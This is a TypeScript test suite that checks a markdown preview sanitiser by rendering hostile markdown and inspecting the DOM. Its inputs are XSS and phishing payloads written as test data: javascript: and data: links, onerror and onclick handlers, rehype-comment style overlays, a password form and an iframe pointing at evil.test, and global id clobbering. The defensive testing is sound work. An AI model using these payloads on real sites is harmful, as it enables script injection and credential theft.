/**
 * Render-level tests for the markdown preview pipeline.
 *
 * sanitize-markdown.test.ts checks `sanitiseNode` one node at a time. That
 * is not enough: @uiw/react-markdown-preview runs `rehype-attr` AFTER the
 * `rehypeRewrite` hook, so attributes written in a `<!--rehype:...-->`
 * comment never reached the sanitiser. These tests render real attacker
 * markdown through the same component and props the app uses, and inspect
 * the resulting DOM.
 */

import { describe, it, expect } from 'vitest'
import { render } from '@testing-library/react'
import MDEditor from '@uiw/react-md-editor'
import { markdownPreviewSecurityProps } from '@/lib/sanitize-markdown'

function renderMarkdown(source: string): HTMLElement {
  const { container } = render(
    <MDEditor.Markdown source={source} {...markdownPreviewSecurityProps} />
  )
  return container
}

/** Every element inside the rendered markdown body (not the wrapper div). */
function bodyElements(container: HTMLElement): Element[] {
  const root = container.querySelector('.wmde-markdown')
  return root ? Array.from(root.querySelectorAll('*')) : []
}

describe('markdown preview: rehype-attr comments', () => {
  it('drops style/class/id set through a <!--rehype:...--> comment', () => {
    const c = renderMarkdown(
      'Click to continue\n<!--rehype:style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999&class=fixed inset-0 z-50&id=login-form-->'
    )
    const p = c.querySelector('.wmde-markdown p')
    expect(p).not.toBeNull()
    expect(p?.getAttribute('style')).toBeNull()
    expect(p?.getAttribute('class')).toBeNull()
    // An id survives only with the content prefix, so it cannot clobber
    // an id or a global the app relies on.
    expect(p?.getAttribute('id')).toBe('user-content-login-form')
  })

  it('drops a javascript: href and on* handlers set through a rehype comment', () => {
    const c = renderMarkdown(
      '[docs](https://example.com)<!--rehype:href=javascript:alert(1)&onclick=alert(2)&target=_top-->'
    )
    const a = c.querySelector('.wmde-markdown a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('href') ?? '').not.toMatch(/javascript/i)
    expect(a?.getAttribute('onclick')).toBeNull()
  })

  it('no element anywhere carries an inline style', () => {
    const c = renderMarkdown(
      '# Title\n<!--rehype:style=display:none-->\n\n- item\n<!--rehype:style=color:red-->\n\n`code`<!--rehype:style=font-size:200px-->'
    )
    for (const el of bodyElements(c)) {
      expect(el.getAttribute('style'), el.outerHTML).toBeNull()
    }
  })
})

describe('markdown preview: raw HTML', () => {
  it('drops attacker-chosen layout classes and ids on raw HTML', () => {
    const c = renderMarkdown(
      '<div class="fixed inset-0 z-50 bg-background" id="credentials">Session expired, sign in again</div>'
    )
    for (const el of bodyElements(c)) {
      const cls = el.getAttribute('class') ?? ''
      expect(cls).not.toMatch(/\b(fixed|inset-0|z-50|bg-background)\b/)
      expect(el.getAttribute('id')).not.toBe('credentials')
    }
  })

  it('neutralises javascript: links, onerror images, forms, iframes and style tags', () => {
    const c = renderMarkdown(
      [
        '<a href="javascript:alert(1)">a</a>',
        '<img src=x onerror="alert(1)">',
        '<form action="https://evil.test"><input name="password"></form>',
        '<iframe src="https://evil.test"></iframe>',
        '<style>body{display:none}</style>',
      ].join('\n\n')
    )
    const html = c.innerHTML
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toMatch(/onerror/i)
    expect(c.querySelector('form, input, iframe, style')).toBeNull()
  })

  it('neutralises javascript: and data: markdown links', () => {
    const c = renderMarkdown(
      '[x](javascript:alert(1)) [y](data:text/html,<script>alert(1)</script>)'
    )
    for (const a of Array.from(c.querySelectorAll('.wmde-markdown a'))) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^(javascript|data):/i)
    }
  })

  it('does not let a raw id clobber a global name', () => {
    renderMarkdown('<img name="currentUser" id="currentUser" src="https://example.com/a.png">')
    expect(document.getElementById('currentUser')).toBeNull()
    expect((window as unknown as Record<string, unknown>).currentUser).toBeUndefined()
  })
})

describe('markdown preview: legitimate markdown still renders', () => {
  it('keeps headings, lists, tables, links and fenced code language classes', () => {
    const c = renderMarkdown(
      [
        '# Heading',
        '',
        '- one',
        '- two',
        '',
        '| a | b |',
        '|---|---|',
        '| 1 | 2 |',
        '',
        '[site](https://example.com) [mail](mailto:a@b.test) [rel](/findings/1)',
        '',
        '```go',
        'func main() {}',
        '```',
      ].join('\n')
    )
    expect(c.querySelector('.wmde-markdown h1')?.textContent).toContain('Heading')
    expect(c.querySelectorAll('.wmde-markdown li')).toHaveLength(2)
    expect(c.querySelector('.wmde-markdown table')).not.toBeNull()
    const hrefs = Array.from(c.querySelectorAll('.wmde-markdown a')).map((a) =>
      a.getAttribute('href')
    )
    expect(hrefs).toEqual(
      expect.arrayContaining(['https://example.com', 'mailto:a@b.test', '/findings/1'])
    )
    expect(c.querySelector('.wmde-markdown code.language-go')).not.toBeNull()
  })
})
